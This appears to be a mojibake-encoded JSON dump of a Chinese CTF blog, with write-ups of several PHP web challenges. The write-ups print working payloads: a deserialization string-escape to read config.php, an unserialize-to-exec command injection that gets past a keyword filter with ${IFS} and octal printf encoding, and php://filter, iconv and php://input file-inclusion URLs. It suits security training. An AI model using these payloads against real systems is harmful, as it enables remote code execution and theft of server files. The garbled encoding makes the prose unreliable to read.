é‚£ä¹ˆè¿™é‡Œå˜æ¢ä»¥åå­—ç¬¦ä¸²ä¼šå˜é•¿ï¼Œé‚£æˆ‘ä»¬åº”è¯¥å°±æ˜¯è®©å‰é¢çš„æŠŠæˆ‘ä»¬æƒ³è¦çš„é€ƒé€¸å‡ºå»ï¼Œè¿™é‡Œå–å‡ºå…³é”®çš„çœ‹çœ‹ \";}s:5:\"photo\";s:10:\"config.php\";} //34ä¸ªå­—ç¬¦ å¾ˆæ˜æ˜¾æˆ‘ä»¬éœ€è¦å†™34ä¸ªwhereå³å¯ï¼Œç„¶åå‰©ä¸‹çš„34ä¸ªå­—ç¬¦å°±ä¸ä¼šè¢«æ­£åˆ™åŒ¹é…ï¼Œå³ä¸‹é¢ä»£ç ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šè¢«æˆåŠŸå½“æˆphotoï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æˆåŠŸè¯»å–åˆ°config.phpäº†ï¼Œæ„é€ å¦‚ä¸‹poc O:1:\"b\":4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:10:\"222@qq.com\";s:8:\"nickname\";s:170:\"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";s:5:\"photo\";s:10:\"config.php\";} åœ¨æ­¤åŸºç¡€ä¸Šè¦åœ¨photoå‰é¢çš„så‰åŠ ä¸€ä¸ªèŠ±æ‹¬å·ï¼Œä»¥è¾¾åˆ°é—­åˆçš„æ•ˆæœ O:1:\"b\":4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:10:\"222@qq.com\";s:8:\"nickname\";s:170:\"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";} æ³¨æ„ä¸Šå›¾çš„æ£€æµ‹ï¼Œpreg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„subjectæ˜¯æ•°ç»„æ—¶ä¼šè¿”å›falseï¼Œå¹¶ä¸”strlenå¤„ç†æ•°ç»„çš„æ—¶å€™ä¹Ÿä¼šè¿”å›false å› æ­¤æˆ‘ä»¬bpæŠ“åŒ…çœ‹çœ‹ åšå¦‚å›¾çš„ä¿®æ”¹å³å¯æ”¾åŒ…å³å¯æˆåŠŸupdate æŸ¥çœ‹æºä»£ç ï¼Œbase64è§£ç å³å¯","categories":["å†…éƒ¨ç«èµ›"]},{"title":"æ”»é˜²ä¸–ç•Œ-unseping","path":"/2023/08/06/unseping/","content":"é¢˜ç›®æè¿°ï¼š unseping é¢˜ç›®è§£é¢˜ï¼š ä¸€é“çŸ¥è¯†ç‚¹æŒºå¤šçš„ã€Šç®€å•é¢˜ã€‹-.- ä»£ç å¤æ‚ç¨‹åº¦ä¸ç®—é«˜ï¼Œç›´æ¥å¼€å®¡ &lt;?php highlight_file(__FILE__); class ease{ private $method; private $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct(){ if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($ip){ exec($ip, $result); var_dump($result); } function waf($str){ if (!preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/\", $str, $pat_array)) { return $str; } else { echo \"don't hack\"; } } function __wakeup(){ foreach($this-&gt;args as $k =&gt; $v) { $this-&gt;args[$k] = $this-&gt;waf($v); } } } $ctf=@$_POST['ctf']; @unserialize(base64_decode($ctf)); ?&gt; æ‰¾åˆ°æ•æ„Ÿå‡½æ•°execï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç”¨æ³• ä¹Ÿå°±æ˜¯è¯´è¯¥å‡½æ•°æ‰§è¡Œç¬¬ä¸€ä¸ªå‚æ•°çš„å‘½ä»¤åï¼Œå°†å†…å®¹å¡«å……åˆ°ç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿™æ ·ä¸var_dumpé…åˆï¼Œå°†æˆåŠŸè¾“å‡ºå‘½ä»¤æ‰§è¡Œåçš„å†…å®¹ã€‚ æ¥ç€åˆçœ‹åˆ°call_user_func_arrayå‡½æ•°ï¼Œçœ‹ä¸€ä¸‹ç”¨æ³• æ„æ€æ˜¯è¯¥å‡½æ•°ä¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°å½“åšä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œå¹¶ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºè¯¥è°ƒç”¨å‡½æ•°çš„å‚æ•°ï¼Œä¸”ç¬¬äºŒä¸ªå‚æ•°è¿˜å¾—æ˜¯æ•°ç»„ï¼Œé‚£å¾ˆæ˜æ˜¾æˆ‘ä»¬éœ€è¦è®©method=pingæ¥è°ƒç”¨pingå‡½æ•°ï¼Œargså°±ä½œä¸ºå‡½æ•°å‚æ•°æ¥ä¼ å…¥ï¼Œä¸å‡ºæ‰€æ–™å°±è¦èµ‹å€¼ä¸ºlsï¼Œcatç­‰ç­‰ï¼Œç´§æ¥ç€çœ‹åˆ°__wakeupæ–¹æ³•ï¼Œå¯¹argsæ•°ç»„çš„å†…å®¹é€šè¿‡foreachå¾ªç¯åšäº†wafå¤„ç†ï¼Œé‚£æˆ‘ä»¬çœ‹ä¸€ä¸‹wafå‡½æ•° preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/\") ä¹Ÿå°±æ˜¯è¿‡æ»¤äº†|, &amp;, ;, ç©ºæ ¼ ``, /ä»¥åŠcat, flag, tac, php, lså­—ç¬¦ ç»•è¿‡ä¹ŸæŒºç®€å•ï¼Œç©ºæ ¼åˆ©ç”¨&lt;, &lt;&gt;, &gt;, ${IFS}ç­‰ï¼Œæ•æ„Ÿå­—ç¬¦é…åˆå•åŒå¼•å·ï¼Œ\\ç¬¦ç­‰ï¼Œé‚£è¿™é‡Œæˆ‘ä»¬å…ˆè®©args=array(â€œl\\sâ€)ï¼Œæ¥æŸ¥çœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆæ–‡ä»¶ ç›´æ¥ä¸Špoc(è¿™é‡Œæ³¨æ„é¢˜ç›®ä¸­çš„å‚æ•°å±æ€§ä¸ºç§æœ‰ï¼Œä¸ºäº†é˜²æ­¢æ•æ„Ÿå­—ç¬¦æˆ‘ä»¬å°†å…¶æ”¹ä¸ºpublicå³å¯) &lt;?php class ease{ public $method; public $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct(){ } function ping($ip){ } function waf($str){ } function __wakeup(){ } } //(!preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/\", $str, $pat_array)) $a = new ease(\"ping\", array('l\\s')); $a = serialize($a); echo $a; echo'&lt;/br&gt;'; echo base64_encode($a); ?&gt; è¿™é‡Œå‘ç°flagæ‰€åœ¨åœ°ï¼Œå½“æ—¶è¯•äº†åŠå¤©ä¸€ç›´catå‡ºä¸æ¥ï¼Œä»¥ä¸ºæ˜¯å“ªé‡Œå‡ºé—®é¢˜ï¼Œçœ‹äº†wpæ‰çŸ¥é“ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚ã€‚ã€‚ã€‚ã€‚ é‚£æˆ‘ä»¬ç»§ç»­ç”¨lsï¼Œè¯»å–çœ‹çœ‹ å°†ä¸Šè¿°æ”¹ä¸ºarray(â€˜l\\s${IFS}f\"\"lag_1s_hereâ€™) å‘ç°flagæ‰€åœ¨åœ°ï¼Œè¿™é‡Œä¹Ÿæœ‰ä¸€ä¸ªç–‘é—®ï¼Œå½“æ—¶æˆ‘array()é‡Œé¢ç”¨çš„åŒå¼•å·åŒ…è£¹ï¼Œç„¶åflagä¹‹å‰ç”¨å•å¼•å·éš”å¼€ï¼Œç¼ºä¸€ç›´è¡Œä¸é€šï¼Œä¸æ¸…æ¥šå•¥åŸå› ï¼Œæˆ–è®¸æ˜¯æ ¼å¼å—ï¼Ÿ éšåä»¤å…¶ç­‰äºarray(â€˜ca\"\"t flag_1s_here/flag_831b69012c67b35f.phpâ€™)ï¼Œä½†å¾ˆæ˜æ˜¾/è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œä¹Ÿä¸çŸ¥é“å¦‚ä½•å¤„ç†ï¼Œå‚è€ƒwpå‘ç°å¯ä»¥ç”¨octå‘½ä»¤ oct ç»•è¿‡å‘½ä»¤æ‰§è¡Œ $(printf \"\\154\\163\")//lså‘½ä»¤ï¼Œè¿™ä¸ªç¼–ç åå¯ä»¥æ‹¼æ¥ éœ€æ³¨æ„ï¼Œç¬¦å·éƒ½ä¸ºè‹±æ–‡çŠ¶æ€ä¸‹ æ­¤æ—¶æˆ‘ä»¬éœ€è¦æ‰§è¡Œå‘½ä»¤ä¸ºcat flag_1s_here/flag_831b69012c67b35f.php $(printf â€œcat flag_1s_here/flag_831b69012c67b35f.phpâ€) ç¼–å†™è„šæœ¬å¯¹å‘½ä»¤è¿›è¡Œasciiç¼–ç ç„¶åå…«è¿›åˆ¶è½¬æ¢ è¿™é‡Œä¹Ÿæ˜¯å€Ÿç”¨è„šæœ¬ï¼Œä¸å¤ªä¼šå†™ã€‚ã€‚ã€‚ str1 = \"cat flag_1s_here/flag_831b69012c67b35f.php\" arr = [] for i in str1: //å¯¹å­—ç¬¦å…ˆè½¬æ¢ä¸ºASCIIç ï¼Œå†è½¬æ¢ä¸ºå…«è¿›åˆ¶ lett = oct(ord(i)) //è¿™ä¸ªä¸»è¦æ˜¯ä¸ºäº†å°†å…«è¿›åˆ¶å‰é¢çš„0oæ›¿æ¢æ‰ lett=str(lett).replace(\"0o\",\"\") arr.append(lett) sym = \"\\\\\" # print(arr) //å°†æ‰€æœ‰çš„å…«è¿›åˆ¶ç»„åˆï¼Œæœ€ç»ˆçš„ç»“æœç¬¬ä¸€ä¸ªåœ°æ–¹åº”è¯¥å†æ·»åŠ ä¸€ä¸ª\\ ccc=sym.join(arr) print(ccc) è·å–åˆ°ç¼–ç åç›´æ¥ç”¨pocè·å¾—payload,ç©ºæ ¼è¿ç”¨${IFS}ç»•è¿‡å³å¯ &lt;?php class ease{ public $method; public $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } } $a = new ease(\"ping\",array('$(printf${IFS}\"\\143\\141\\164\\40\\146\\154\\141\\147\\137\\61\\163\\137\\150\\145\\162\\145\\57\\146\\154\\141\\147\\137\\70\\63\\61\\142\\66\\71\\60\\61\\62\\143\\66\\67\\142\\63\\65\\146\\56\\160\\150\\160\")')); $b = serialize($a); echo $b; echo'&lt;/br&gt;'; echo base64_encode($b); ?&gt; å‚è€ƒæ–‡ç« ï¼š å‚è€ƒwp RCEç»•è¿‡å§¿åŠ¿å‚è€ƒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-file_include","path":"/2023/08/02/gong-fang-shi-jie-file-include/","content":"é¢˜ç›®æè¿°ï¼š æ€ä¹ˆè¯»å–æ–‡ä»¶å‘¢ï¼Ÿ é¢˜ç›®è§£é¢˜ï¼š ç®€å•çš„PHPä»£ç  &lt;?php highlight_file(__FILE__); include(\"./check.php\"); if(isset($_GET['filename'])){ $filename = $_GET['filename']; include($filename); } ?&gt; ä»¥ä¸ºé¢˜ç›®å¾ˆç®€å•ï¼Œæˆ‘ç›´æ¥å°è¯•php://filteråè®®è¯»å–æºä»£ç ï¼Œå´å‘ç°åšäº†wafï¼Œäºæ˜¯è’™äº†ï¼Œæ‰€ä»¥å‚è€ƒäº†å¤§ä½¬çš„wp æ€è·¯å°±æ˜¯æ ¹æ®é¢˜ç›®é€æ­¥çŒœæµ‹å…¶è¿‡æ»¤çš„å†…å®¹ï¼Œè¾“å…¥å¦‚ä¸‹ä¸¤ä¸ªpayloadå‘ç°ï¼š http://61.147.171.105:64434/?filename=php://fil1ter/con1vert.ba1se64-e1ncode/resource=index.php http://61.147.171.105:64434/?filename=php://filter/convert.base64-e1ncode/resource=index.php ç¬¬ä¸€ä¸ªpayloadï¼Œæç¤ºä¸è§äº†ï¼Œç¬¬äºŒä¸ªpayloadä¾ç„¶æœ‰æç¤ºï¼Œè¯´æ˜base64-encodeå…³é”®è¯è¢«è¿‡æ»¤ï¼›ç›´æ¥åœ¨ç½‘ä¸Šæœæ–‡ä»¶åŒ…å«ç»•è¿‡base64-encode,æœ€ç»ˆæ‰¾åˆ°äº†convert.iconv.* ç»•è¿‡. convert.iconv.* ç»•è¿‡ è¿™ä¸ªè¿‡æ»¤å™¨éœ€è¦phpæ”¯æŒiconvï¼Œè€Œiconvæ˜¯é»˜è®¤ç¼–è¯‘çš„ã€‚ä½¿ç”¨convert.iconv.*è¿‡æ»¤å™¨ç­‰åŒäºç”¨iconv()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ iconv â€” å­—ç¬¦ä¸²æŒ‰è¦æ±‚çš„å­—ç¬¦ç¼–ç æ¥è½¬æ¢ convery.iconv.*çš„ä½¿ç”¨æœ‰ä¸¤ç§æ–¹æ³•: convert.iconv.. convert.iconv./ å’Œå°±æ˜¯ç¼–ç æ–¹å¼ï¼Œæœ‰å¦‚ä¸‹å‡ ç§(ä»¥ä¸‹ä¸å…¨)ï¼š 1 UCS-4* 2 UCS-4BE 3 UCS-4LE* 4 UCS-2 5 UCS-2BE 6 UCS-2LE 7 UTF-32* 8 UTF-32BE* 9 UTF-32LE* 10 UTF-16* 11 UTF-16BE* 12 UTF-16LE* 13 UTF-7 14 UTF7-IMAP 15 UTF-8* 16 ASCII* 17 EUC-JP* 18 SJIS* 19 eucJP-win* 20 SJIS-win* 21 ISO-2022-JP 22 ISO-2022-JP-MS 23 CP932 24 CP51932 25 BASE64 å…·ä½“å¯å‚è€ƒå®˜æ–¹æ‰‹å†Œhttps://www.php.net/manual/en/mbstring.supported-encodings.php æœ¬é¢˜ä¸­æˆ‘ä»¬é€ä¸ªè¿›è¡Œå°è¯•ï¼Œæœ€ç»ˆå°è¯•http://61.147.171.105:64434/?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=index.phpå¯ä»¥è¿›è¡Œç»•è¿‡ã€‚ é€šè¿‡è¯»å–index.phpï¼Œå‘ç°æ²¡æœ‰æç¤ºæ–‡å­—ã€‚ è¯»å–check.phpï¼Œå‘ç°è¿‡æ»¤æ–‡ä»¶ ç›´æ¥è¯»å–flag.phpçœ‹çœ‹ï¼ŒæˆåŠŸå¾—åˆ° å‚è€ƒæ–‡ç« ï¼š åŸºç¡€PHPä¼ªåè®®çŸ¥è¯†å‚è€ƒ wpå‚è€ƒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-easyphp","path":"/2023/08/02/gong-fang-shi-jie-easyphp/","content":"é¢˜ç›®æè¿°ï¼š easyphp é¢˜ç›®è§£é¢˜ï¼š ä¸€é“ã€Šç®€å•çš„ã€‹PHPç‰¹æ€§é¢˜ ä»£ç æœ‰ç‚¹é«˜æ·±ï¼Œå¯¹äºèœé¸¡çš„æˆ‘ï¼Œæœ‰ç‚¹å®¡ä¸è¿‡æ¥ï¼Œå°±èƒ½ç”³çš„å°±ç”³ &lt;?php highlight_file(__FILE__);//é«˜äº®æ–‡ä»¶ $key1 = 0; $key2 = 0; $a = $_GET['a']; //åŒä¸‹ï¼Œgetä¼ å‚ $b = $_GET['b']; if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3){//å¦‚æœaä¸ä¸ºç©ºï¼Œä¸”aå–è¯å¤§äºæŒ‡å®šæ•°å­—ï¼Œé•¿åº¦å°äº3è¿›å…¥ä¸‹ä¸€æ­¥ if(isset($b) &amp;&amp; '8b184b' === substr(md5($b),-6,6)){ //å¦‚æœbå­˜åœ¨ï¼Œä¸”bçš„md5ç¼–ç çš„æŒ‡å®šéƒ¨åˆ†ç­‰äºæŒ‡å®šå­—ç¬¦ä¸²ï¼Œè¿›å…¥ä¸‹ä¸€éƒ¨ $key1 = 1; //å°†è¯¥å˜é‡èµ‹å€¼ä¸º1 }else{ die(\"Emmm...å†æƒ³æƒ³\"); } }else{ die(\"Emmm...\"); } $c=(array)json_decode(@$_GET['c']); //æ¥å—ä¸€ä¸ª JSON ç¼–ç çš„å­—ç¬¦ä¸²Cå¹¶ä¸”æŠŠå®ƒè½¬æ¢ä¸º PHP å€¼å†™åˆ°æ•°ç»„arrayä¸­ if(is_array($c) &amp;&amp; !is_numeric(@$c[\"m\"]) &amp;&amp; $c[\"m\"] &gt; 2022){//å¦‚æœCæ˜¯æ•°ç»„ï¼Œä¸”$c[\"m\"]ä¸æ˜¯æ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ä¸”$c[\"m\"]å¤§äº2022 if(is_array(@$c[\"n\"]) &amp;&amp; count($c[\"n\"]) == 2 &amp;&amp; is_array($c[\"n\"][0])){//å¦‚æœc[\"n\"]æ˜¯æ•°ç»„ ä¸”c[\"n\"]çš„å…ƒç´ å€¼ä¸º2 ä¸”$c[\"n\"][0])æ˜¯æ•°ç»„ $d = array_search(\"DGGJ\", $c[\"n\"]);//dåœ¨æ•°ç»„c[\"n\"]ä¸­æœç´¢\"DGGJ\"ï¼Œå¦‚æœåŒ¹é…æˆåŠŸè¿”å›é”®å€¼ $d === false?die(\"no...\"):NULL;//d ä¸º falseçš„è¯ï¼ŒæŒ‚æ‰ï¼Œè¾“å‡ºno... foreach($c[\"n\"] as $key=&gt;$val){//æ£€æŸ¥æ•°ç»„c[\"n\"] $val===\"DGGJ\"?die(\"no......\"):NULL;//å¦‚æœc[\"n\"]æ˜¯\"DGGJ\"ï¼ŒæŒ‚æ‰ï¼Œè¾“å‡ºno...... } $key2 = 1;//èµ‹å€¼key2=1ï¼› }else{ die(\"no hack\"); } }else{ die(\"no\"); } if($key1 &amp;&amp; $key2){//è‹¥è¿™ä¸¤ä¸ªå˜é‡å­˜åœ¨ï¼Œåˆ™å›æ˜¾flag include \"Hgfks.php\"; echo \"You're right\".\" \"; echo $flag; } ?&gt; Emmm... 1 æ ¹æ®ç¬¬9è¡Œ if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3) åœ¨å˜é‡aä¸­å†™å…¥æ•´æ•°å€¼å¤§äº6000000ä¸”é•¿åº¦å°äº3çš„å­—ç¬¦ä¸²ã€‚ 2 æ ¹æ®ç¬¬10è¡Œ if(isset($b) &amp;&amp; '8b184b' === substr(md5($b),-6,6)) åœ¨å˜é‡bä¸­å†™å…¥æœ«å°¾md5ä¸º'8b184b'çš„å­—ç¬¦ä¸²ï¼Œæˆ‘åœ¨å°è±¡é‡Œæœ‰MD5ç¢°æ’ä¸“ç”¨çš„ç½‘ç«™ï¼› 3 æ ¹æ®ç¬¬20è¡Œ if(is_array($c) &amp;&amp; !is_numeric(@$c[\"m\"]) &amp;&amp; $c[\"m\"] &gt; 2022) åœ¨æ•°ç»„cçš„æˆå‘˜mä¸­å†™å…¥ä¸æ˜¯æ•°å­—æˆ–æ•°ç»„å­—ç¬¦ä¸²ä¸”å€¼å¤§äº2022çš„ 4 æ ¹æ®ç¬¬21è¡Œ if(is_array(@$c[\"n\"]) &amp;&amp; count($c[\"n\"]) == 2 &amp;&amp; is_array($c[\"n\"][0])) åœ¨æ•°ç»„cçš„æˆå‘˜nä¸­å†™å…¥å…ƒç´ å€¼ä¸º2ä¸”c[\"n\"][0])æ˜¯æ•°ç»„çš„ 5 æ ¹æ®ç¬¬22è¡Œ $d = array_search(\"DGGJ\", $c[\"n\"]); å¦‚æœ\"DGGJ\"ä¸$c[\"n\"]ï¼‰çš„æœç´ ç»“æœåŒ¹é…ï¼Œä¸”c[\"n\"]ä¸å¯ä»¥æ˜¯\"DGGJ\"æœ¬èº« 6 æ ¹æ®ç¬¬19è¡Œ $c=(array)json_decode(@$_GET['c']); æ•°ç»„cé™¤äº†ä¸Šè¿°è¦æ±‚å¤–ï¼Œè¿˜éœ€è¦æ˜¯JSON ç¼–ç ã€‚ ç¬¬ä¸€ä¸ªï¼šæŸ¥çœ‹å®˜æ–¹æ–‡æ¡£å‘ç°1e10æ•°å­—å¾ˆå¤§ï¼Œä½†è¦æ±‚æˆ‘ä»¬é•¿åº¦å°äº4ï¼Œé‚£æˆ‘ä»¬è¯•è¯•1e9 å¾ˆæ˜æ˜¾å¯ä»¥çš„ï¼ŒæˆåŠŸç»•è¿‡ ç¬¬äºŒä¸ªï¼šåº”è¯¥æ˜¯md5ç¢°æ’ï¼Œä¸è¿‡è¿™é‡Œå†™è„šæœ¬æ›´åˆé€‚ï¼Œä½†å¤ªèœäº†ï¼Œå°±çœ‹çœ‹å¤§ä½¬å¦‚ä½•å†™çš„å§ &lt;?php for($b=1;$b&lt;=100000;$b++){ //bä»1åˆ°100000 if(preg_match('/^8b184b/',substr(md5($b),-6,6))){ //åŒ¹é…md5bçš„æœ«å°¾ä¸º8b184b echo $b; //è¾“å‡ºb echo \" \"; echo md5($b); //è¾“å‡ºmd5 echo \" \"; } } ?&gt; ä»£ç ä¹Ÿå¾ˆç®€å•ï¼ˆä½†æˆ‘ä¾æ—§æƒ³ä¸åˆ°-.-ï¼‰é‡‡ç”¨ä¸€ä¸ªç®€å•çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¦‚æœåŒ¹é…åˆ™è¾“å‡ºbï¼Œæˆ‘ä»¬è¿è¡Œä¸€ä¸‹çœ‹çœ‹ ç¬¬ä¸‰ä¸ªï¼šif(is_array($c) &amp;&amp; !is_numeric(@$c[â€œmâ€]) &amp;&amp; $c[â€œmâ€] &gt; 2022) é¦–å…ˆæˆ‘ä»¬çŸ¥é“cæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸”æœ‰ä¸¤ä¸ªå…ƒç´ å³c=array(â€˜mâ€™,â€˜nâ€™); å…ˆå¥—ç”¨JSONç¼–ç è¿è¡Œä¸€éï¼Œå°±æ˜¯æŠŠc[â€œmâ€]='9001 'å†™æˆc={â€œmâ€:â€œ9001aâ€}ï¼›è¿™é‡Œæ³¨æ„åŒå¼•å·ï¼Œå› ä¸ºæ ¹æ®å®˜æ–¹æ•™ç¨‹ï¼Œå†™å•å¼•å·JSONæ˜¯ä¸æ­£ç¡®çš„ ç¬¬å››ä¸ªä¸ç¬¬äº”ä¸ªï¼šif(is_array(@$c[\"n\"]) &amp;&amp; count($c[\"n\"]) == 2 &amp;&amp; is_array($c[\"n\"][0])) $d = array_search(\"DGGJ\", $c[\"n\"]); array_searchç»•è¿‡å¯ä»¥å‚è€ƒåšæ–‡ï¼šCTFä¸­å¸¸è§çš„ PHP å¼±ç±»å‹æ¼æ´æ€»ç»“ - åŒ—æè¾¹ç•Œå®‰å…¨å›¢é˜Ÿ - åšå®¢å›­ (cnblogs.com) ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š &lt;?php if(!is_array($_GET['test'])){exit();} $test=$_GET['test']; for($i=0;$i&lt;count($test);$i++){ if($test[$i]===\"admin\"){ echo \"error\"; exit(); } $test[$i]=intval($test[$i]); } if(array_search(\"admin\",$test)===0){ echo \"flag\"; } else{ echo \"false\"; } ?&gt; è¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯å…ˆåˆ¤æ–­æ˜¯ä¸æ˜¯æ•°ç»„ï¼Œç„¶ååœ¨æŠŠæ•°ç»„ä¸­çš„å†…å®¹ä¸€ä¸ªä¸ªè¿›è¡Œéå†ï¼Œæ‰€æœ‰å†…å®¹éƒ½ä¸èƒ½ç­‰äºadmin,ç±»å‹ä¹Ÿå¿…é¡»ç›¸åŒï¼Œç„¶åè½¬åŒ–æˆintå‹ï¼Œç„¶åå†è¿›è¡Œæ¯”è¾ƒå¦‚æœå¡«å…¥å€¼ä¸adminç›¸åŒï¼Œåˆ™è¿”å›flag,å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ åŸºæœ¬æ€è·¯è¿˜æ˜¯ä¸å˜ï¼Œå› ä¸ºç”¨çš„æ˜¯ä¸‰ä¸ªç­‰äºå·ï¼Œæ‰€ä»¥è¯´â€œ= =â€å·è¿™ä¸ªæ–¹æ³•åŸºæœ¬ä¸èƒ½ç”¨ï¼Œé‚£å°±ç”¨ç¬¬äºŒæ¡æ€è·¯ï¼Œåˆ©ç”¨å‡½æ•°æ¥å…¥åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹è¿”å›â€œ0â€è¿™ä¸ªç‰¹æ€§ï¼Œç›´æ¥ç»•è¿‡æ£€æµ‹ã€‚æ‰€ä»¥payloadï¼štest[]=0ã€‚ â€‹\tå› æ­¤è¿™é“é¢˜æˆ‘ä»¬å¯ä»¥ æˆ‘ä»¬ç›´æ¥ä¸ºc[n0]èµ‹äºˆç©ºå€¼æ•°ç»„ï¼Œä¿è¯å¯ä»¥é€šè¿‡is_array($c[â€œnâ€][0])çš„åˆ¤å®šï¼Œc[n1]èµ‹äºˆç©ºå€¼ï¼Œå³c=[[],0];0çš„è¯ï¼Œç”±äºè¿™é‡Œæ˜¯å¼ºæ¯”è¾ƒé‚£ä¹ˆ0è‚¯å®šä¸ç­‰äºfalseï¼Œä¾¿æˆåŠŸç»•è¿‡ æœ€ç»ˆcèµ‹å€¼ä¸ºc={\"m\":\"9001 \",\"n\":[[0],0]} payloadä¸ºï¼š ?a=1e9&amp;b=53724&amp;c={\"m\":\"9001 \",\"n\":[[0],0]} å¾—åˆ°flag å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-fileclude","path":"/2023/08/02/gong-fang-shi-jie-fileclude/","content":"é¢˜ç›®æè¿°ï¼š å¥½å¤šfileå‘€ï¼ é¢˜ç›®è§£é¢˜ï¼š ä¾æ—§æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œæˆ‘ä»¬è¿›è¡Œä»£ç å®¡è®¡ WRONG WAY! &lt;?php include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET[\"file1\"]) &amp;&amp; isset($_GET[\"file2\"])) { $file1 = $_GET[\"file1\"]; $file2 = $_GET[\"file2\"]; if(!empty($file1) &amp;&amp; !empty($file2)) { if(file_get_contents($file2) === \"hello ctf\") { include($file1); } } else die(\"NONONO\"); } æµç¨‹ä¸ºå¦‚æœgetä¼ å‚file1ä¸file2å¹¶ä¸”å…¶ä¸­çš„file2å‚æ•°ç­‰äºhello ctfï¼Œåˆ™åŒ…å«includeï¼Œå¦åˆ™é€€å‡ºç¨‹åº å¾ˆæ˜æ˜¾å˜é‡file2å¯ä»¥é‡‡ç”¨php://inputåè®®ç»•è¿‡ï¼Œä¸”å†…å®¹ä¸ºæŒ‡å®šå†…å®¹ï¼Œå˜é‡file1æˆ‘ä»¬é‡‡å–PHPä¼ªåè®®è¯»å–æºç å³å¯ï¼Œè¿™é‡Œå·²ç»æœ‰æç¤ºè¦æˆ‘ä»¬è¯»å–flag.phpæ–‡ä»¶ payloadå¦‚ä¸‹ï¼š ?file1=php://filter/convert.base64-encode/resource=flag.php&amp;file2=php://input è¿™é‡Œfile2çš„å†…å®¹è¦ç”¨bpæŠ“åŒ…æ·»åŠ hello ctfï¼Œç›´æ¥ç”¨hackbaræ— æ³•æˆåŠŸï¼Œå› ä¸ºåœ¨postæ ä¸­çš„å†…å®¹è¦ä¸ºé”®å€¼å¯¹çš„å½¢å¼æ–¹å¯æ‰§è¡Œ å¦‚å›¾æˆåŠŸå¾—åˆ°flagï¼Œbase64è§£ç å³å¯ å‚è€ƒæ–‡ç« ï¼š wpå¯å‚è€ƒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-fileinclude","path":"/2023/08/02/gong-fang-shi-jie-fileinclude/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š ç®€å•çš„æ–‡ä»¶åŒ…å«é¢˜ç›®ï¼Œä½†æ˜¯æˆ‘åˆšçœ‹åˆ°è¯¥é¡µé¢çš„æ—¶å€™ä¸€è„¸æ‡µï¼Œä»£ç å‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Œçœ‹äº†çœ‹wpå‘ç°æœ€åŸºæœ¬çš„æŸ¥çœ‹æºä»£ç æ­¥éª¤å¿˜äº†â€¦ æˆ‘ä»¬å¼€å§‹å®¡è®¡ä»£ç ï¼Œè¿™é“é¢˜å°±æ˜¯è®©æˆ‘ä»¬è®¾ç½®ä¸€ä¸ªlanguageå˜é‡çš„cookieå¹¶å°†å…¶å€¼ä¼ ç»™lanï¼Œå¦‚æœè¯¥lanå˜é‡å­˜åœ¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥åŒ…å«ä¸€ä¸ªå¯æ§çš„phpæ–‡ä»¶ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œæˆ‘ä»¬ä»¤lanä¸ºè¯»å–å“åº”æ–‡ä»¶æºç çš„ä»£ç å³å¯ï¼Œpayloadå¦‚ä¸‹ï¼š language=php://filter/convert.base64-encode/resource=flag //å­—ç¬¦ä¸²æ‹¼æ¥å³å¯æ„é€ å¤„flag.php base64è§£ç å³å¯ æ‹¿åˆ°flag å‚è€ƒæ–‡ç« ï¼š å¤ç°å‚è€ƒï¼š 